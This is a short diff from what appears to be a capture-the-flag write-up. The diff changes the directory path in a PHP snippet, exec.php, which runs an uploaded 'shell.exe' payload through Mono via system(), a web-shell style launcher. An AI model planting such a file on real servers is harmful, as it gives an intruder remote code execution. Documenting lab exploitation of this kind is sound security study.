@@ -219,7 +219,7 @@ A cool possible beyond root would be to try the [Mono exploit](https://www.gabri
 └─$ cat exec.php 
 <?php
 // Navigate to the directory where payload is uploaded
-chdir('/usr/share/nginx/html/');
+chdir('/var/www/aspnet/');
 
 // Execute the payload using Mono CLR interpreter
 $output = system('mono shell.exe');
